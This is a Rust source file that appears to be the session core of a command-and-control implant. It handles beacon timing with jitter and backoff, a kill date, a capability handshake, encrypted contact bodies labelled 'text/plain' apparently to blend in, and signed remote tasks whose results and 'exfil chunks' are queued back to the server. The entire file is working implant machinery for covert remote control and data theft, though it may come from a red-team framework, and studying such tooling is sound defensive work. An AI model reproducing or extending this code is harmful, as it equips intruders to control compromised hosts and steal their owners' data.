

use prost::Message;

use crate::envelope;
use crate::handlers::{self, Cadence};
use crate::outbox::Outbox;
use crate::trust::Certificate;
use crate::verify::{self, NonceTracker, Verdict};
use crate::wire::{Frame, FrameKind, HandshakeRequest, HandshakeResponse, ProtocolVersion, TaskRequest};

/// Everything a contact carriage needs to serve one run: identity, the
/// advertisement, the live cadence, the seal, the signer pool, and the
/// cross-carriage task state (nonce floor, ledger, batch). Carriages borrow
/// the session; the session owns nothing transport-shaped. The nonce floor
/// deliberately spans carriages and reconnects -- the server's counter is
/// per-implant, so a replay through any door falls at the same floor.
pub struct Session {
    pub implant_id: String,
    advertised: Vec<String>,
    pub cadence: Cadence,
    pub seal: Option<Seal>,
    signer_pool: Vec<Certificate>,
    pub kill_date: Option<String>,
    pub nonces: NonceTracker,
    pub outbox: Outbox,
    contact_counter: u64,
}

/// The per-artifact contact seal split into its wire halves.
pub struct Seal {
    pub key_id: [u8; 16],
    pub key: [u8; 32],
}

impl Seal {
    pub fn parse(baked: &str) -> Option<Seal> {
        let (key_id, key) = envelope::parse_baked_key(baked)?;
        Some(Seal { key_id, key })
    }

    pub fn seal(&self, plaintext: &[u8], aad: &str) -> Vec<u8> {
        envelope::seal_contact_body(plaintext, &self.key_id, &self.key, aad)
    }

    pub fn open(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
        envelope::try_open_contact_body(body, &self.key_id, &self.key, aad)
    }
}

/// What the run loop does after one contact attempt.
pub enum Attempt {
    /// The cycle crossed and its response was processed.
    Crossed,
    /// The server's answer is permanent for this artifact.
    Refused,
}

impl Session {
    pub fn new(
        implant_id: String,
        baked_verbs: &[String],
        cadence: Cadence,
        signer_pool: Vec<Certificate>,
        seal: Option<Seal>,
        kill_date: Option<String>,
    ) -> Session {
        // The advertisement is the baked class verbs intersected with this
        // build's compiled handlers: the server only dispatches what this
        // binary can run (architecture.md Sec 5.3).
        let advertised = baked_verbs
            .iter()
            .filter(|verb| handlers::COMPILED_VERBS.contains(&verb.as_str()))
            .cloned()
            .collect();
        Session {
            implant_id,
            advertised,
            cadence,
            seal,
            signer_pool,
            kill_date,
            nonces: NonceTracker::default(),
            outbox: Outbox::default(),
            contact_counter: 0,
        }
    }

    pub fn kill_date_passed(&self) -> bool {
        self.kill_date
            .as_deref()
            .and_then(crate::profile::parse_iso_to_unix)
            .map(|kill| crate::profile::unix_now() > kill)
            .unwrap_or(false)
    }

    /// The jittered inter-cycle sleep, widened by consecutive failures (the
    /// exponential backoff both .NET clients apply).
    pub fn backoff_sleep(&self, failures: u32) {
        let (base, jitter) = *self.cadence.lock().expect("cadence");
        let widened = (base.max(1.0) * 2f64.powi(failures.min(5) as i32)).min(600.0);
        let slack = if jitter > 0.0 {
            rand::Rng::gen_range(&mut rand::thread_rng(), -jitter..=jitter)
        } else {
            0.0
        };
        std::thread::sleep(std::time::Duration::from_secs_f64((widened + slack).max(0.1)));
    }

    /// The handshake this run opens every contact with: identity, protocol
    /// version, both negotiation arms, and the fresh cadence (architecture.md
    /// Sec 10.3 -- one advertisement rides each contact).
    pub fn handshake_frame(&mut self) -> Frame {
        let (sleep, jitter) = *self.cadence.lock().expect("cadence");
        Frame {
            payload: HandshakeRequest {
                version: Some(ProtocolVersion { major: 1, minor: 0 }),
                implant_id: self.implant_id.clone(),
                capabilities: self.advertised.clone(),
                replay_nonces: Some(true),
                task_acks: Some(true),
                sleep_seconds: Some(sleep),
                jitter_seconds: Some(jitter),
            }
            .encode_to_vec(),
            kind: 0,
        }
    }

    /// Reads the handshake answer: negotiates the nonce arm and returns the
    /// ack arm plus the run decision.
    pub fn handshake_answered(&mut self, frame: &Frame) -> Result<(bool, Attempt), &'static str> {
        let answer = HandshakeResponse::decode(frame.payload.as_ref())
            .map_err(|_| "the handshake answer was malformed")?;
        if answer.status != crate::wire::HandshakeStatus::Ok as i32 {
            return Ok((false, Attempt::Refused));
        }
        self.nonces.negotiated = answer.replay_nonces.unwrap_or(false);
        Ok((answer.task_acks.unwrap_or(false), Attempt::Crossed))
    }

    /// Encodes frames as this run's outgoing body: the framed bytes behind a
    /// fresh big-endian counter, sealed under the bake's key when it carries
    /// one; the counter burns per attempt, not per delivery, so a
    /// retransmission never trips the server's replay floor.
    pub fn encode_outgoing(&mut self, frames: &[Frame]) -> (Vec<u8>, &'static str) {
        let encoded = crate::wire::encode(frames);
        match &self.seal {
            Some(seal) => {
                self.contact_counter += 1;
                let mut plaintext = Vec::with_capacity(8 + encoded.len());
                plaintext.extend_from_slice(&self.contact_counter.to_be_bytes());
                plaintext.extend_from_slice(&encoded);
                (
                    seal.seal(&plaintext, envelope::CONTACT_REQUEST_AAD),
                    "text/plain",
                )
            }
            None => (encoded, "application/octet-stream"),
        }
    }

    /// Decodes an incoming body: sealed under the response's own purpose tag
    /// when the run seals, else the plaintext frames. A body that does not
    /// verify is a dropped cycle -- nothing inside it is acted on.
    pub fn decode_incoming(&self, body: &[u8]) -> Option<Vec<Frame>> {
        let plaintext = match &self.seal {
            Some(seal) => seal.open(body, envelope::CONTACT_RESPONSE_AAD)?,
            None => body.to_vec(),
        };
        crate::wire::parse(&plaintext)
    }

    /// The acceptance every carriage runs for one dispatched task:
    /// verification first (the replay defense stays ahead of the ledger),
    /// then dedup from the cache, then dispatch. Results and exfil chunks
    /// queue into the batch; the delivery mark is the carriage's to set.
    pub fn accept(&mut self, task: &TaskRequest, acks: bool) {
        if acks {
            self.outbox.acknowledge(&task.task_id);
        }
        if task.staged_bytes.is_some() {
            // The staged arm is carriage-specific: the poll batch defers the
            // pull to its next cycle, the stream pulls inline. Both reach
            // this method only after their own staged handling, so landing
            // here with the flag set means the carriage declined it.
            return;
        }
        let verdict = verify::verify(
            &self.implant_id,
            task,
            &self.signer_pool,
            &mut self.nonces,
        );
        match verdict {
            Verdict::Accepted => {
                if self.outbox.holds(&task.task_id) {
                    // The dedup half: a redelivery is answered from the cache
                    // (or, while unfinished, merely re-acked) -- nothing
                    // re-executes.
                    if let Some((outcome, output)) = self.outbox.cached(&task.task_id) {
                        self.outbox.result(&task.task_id, outcome, &output);
                    }
                    return;
                }
                // Dispatch runs exactly once: the result and its out-of-band
                // chunks both come off this one execution.
                let handler = handlers::dispatch(&task.verb, &task.arguments, &self.cadence);
                let outcome = if handler.outcome == handlers::Outcome::Succeeded { 1 } else { 2 };
                self.outbox.result(&task.task_id, outcome, &handler.output);
                for mut chunk in handler.chunks {
                    chunk.task_id = task.task_id.clone();
                    self.outbox.queue(Frame {
                        payload: chunk.encode_to_vec(),
                        kind: FrameKind::ExfilChunk as i32,
                    });
                }
            }
            rejected => {
                let cause = match rejected {
                    Verdict::RejectedReplay => format!(
                        "task rejected: replayed tasking (nonce {:?} at or below the accepted floor); not executed",
                        task.task_nonce
                    ),
                    Verdict::RejectedNoNonce => {
                        "task rejected: no task nonce after the replay-nonce handshake; not executed".to_string()
                    }
                    _ => "task rejected: signature verification failed; not executed".to_string(),
                };
                self.outbox.result(&task.task_id, 2, &cause);
            }
        }
    }
}
